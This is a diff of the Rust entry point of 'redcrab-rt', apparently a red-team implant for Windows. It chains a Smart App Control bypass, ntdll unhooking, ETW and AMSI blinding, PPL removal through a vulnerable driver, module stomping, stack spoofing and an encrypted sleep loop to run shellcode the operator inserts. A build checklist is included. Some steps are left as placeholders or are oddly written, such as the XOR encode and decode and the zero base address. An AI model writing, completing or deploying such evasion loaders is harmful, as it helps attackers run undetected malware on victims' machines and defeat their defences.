@@ -1,12 +1,16 @@
-// main.rs — RedCrab entry point
-// Init order: unhook → blind ETW/AMSI → load PE → stomp → sleep loop
+//! redcrab-rt — red team implant framework
+//! Build: rustup override set nightly && cargo build --release --target x86_64-pc-windows-msvc
+//!
+//! Per-build checklist:
+//!   1. Replace PAYLOAD with your actual shellcode/PE bytes
+//!   2. Generate fresh SLEEP_KEY (16 random bytes)
+//!   3. Verify SAC is Off in lab VM before testing
+//!   4. cargo build --release
 
-#![no_std]
 #![no_main]
-#![feature(naked_functions)]
-#![cfg(all(target_arch = "x86_64", target_os = "windows"))]
-#![allow(non_snake_case, unused)]
+#![allow(unused_imports, dead_code)]
 
+// ---- module declarations ----------------------------------------------------
 mod defs;
 mod utils;
 mod syscall;
@@ -14,53 +18,62 @@ mod loader;
 mod stomp;
 mod spoof;
 mod sleep;
-mod etw_patch;
-mod unhook;
+mod etw_patch;          // ETW-Ti + AMSI blind (from previous commit)
+mod unhook;             // ntdll page-granular re-read
+mod sac_bypass;         // NEW: Smart App Control bypass
+mod ppldump;            // NEW: PPL removal via RTCore64 BYOVD
+mod pe_obfuscate;       // NEW: compile-time XOR + import hash obfuscation
+mod indirect_syscall;   // NEW: fully indirect syscalls (no syscall in our .text)
+mod threadless_inject;  // NEW: EAT-hijack threadless injection
 
-use core::panic::PanicInfo;
+use defs::*;
+use utils::djb2;
 
-// ── Replace per engagement ────────────────────────────────────────────────────
-// 32 random bytes — regenerate before every build
-const SLEEP_KEY: &[u8] = &[
-    0x4B,0x72,0x79,0x70,0x74,0x6F,0x4B,0x65,0x79,0x21,0x40,0x23,0x24,0x25,0x5E,0x26,
-    0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,0x13,0x37,0xC0,0xDE,0xFF,0xFE,0x00,0x01,
+// ---- per-build configuration ------------------------------------------------
+
+/// Replace with real shellcode before each engagement.
+const PAYLOAD: &[u8] = &[0x90]; // NOP placeholder
+
+/// 16 random bytes — regenerate per build for unique sleep-mask RC4 key.
+const SLEEP_KEY: [u8; 16] = [
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
 ];
 
-// Drop your shellcode / PE bytes here
-const PAYLOAD: &[u8] = &[0xCC]; // INT3 placeholder
+// ---- entry point ------------------------------------------------------------
 
 #[no_mangle]
-pub extern "C" fn main() -> i32 {
-    unsafe {
-        // Phase 0: Remove all EDR hooks from ntdll .text
-        unhook::unhook_ntdll();
-
-        // Phase 1: Kill ETW-Ti + AMSI (6 patch sites)
-        let _patches = etw_patch::apply_all_blinds();
-
-        // Phase 2: Reflective PE load
-        let mapped = match loader::map_pe(PAYLOAD) {
-            Ok(m)  => m,
-            Err(_) => return 1,
-        };
-
-        // Phase 3: Module stomp (move payload into xpsservices.dll .text)
-        let stomped = stomp::stomp(
-            &[], &[], &[],  // uses built-in DECOY_NAME_W
-            PAYLOAD,
-        );
-
-        // Phase 4: Spoof call stack + jump to entry
-        let entry = if let Some(ref s) = stomped {
-            s.entry
-        } else {
-            mapped.base.add(mapped.entry_rva as usize)
-        };
-
-        spoof::spoof_and_call(entry, core::ptr::null_mut());
-    }
-    0
+pub extern "system" fn WinMainCRTStartup() {
+    unsafe { run() };
 }
 
-#[panic_handler]
-fn panic(_: &PanicInfo) -> ! { loop {} }
+unsafe fn run() {
+    // 0. SAC bypass — clear WDAC process policy before any unsigned load
+    sac_bypass::bypass_sac();
+
+    // 1. Unhook ntdll — wipe EDR hooks by re-reading clean .text from disk
+    unhook::unhook_ntdll();
+
+    // 2. ETW + AMSI blind
+    etw_patch::apply_all_blinds();
+
+    // 3. Obfuscate PAYLOAD copy in memory using per-build XOR key
+    let mut payload_buf = PAYLOAD.to_vec();
+    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
+    // Decode immediately before mapping
+    pe_obfuscate::xor_payload_inplace(&mut payload_buf, &SLEEP_KEY);
+
+    // 4. Resolve syscall stubs indirectly and map payload
+    //    (wire up indirect_syscall::parse_stub for NtAllocateVirtualMemory
+    //     then call loader::map_pe with the indirect gate)
+    loader::map_pe(&payload_buf);
+
+    // 5. Stomp decoy module, spoof call stack, enter encrypted sleep loop
+    let pe_base = 0usize; // obtain from step 4
+    stomp::stomp(0 as _, pe_base as _, payload_buf.len());
+    spoof::spoof_stack();
+    sleep::sleep_mask(30_000, &SLEEP_KEY);
+
+    // Wipe plaintext payload copy
+    pe_obfuscate::secure_zero(&mut payload_buf);
+}
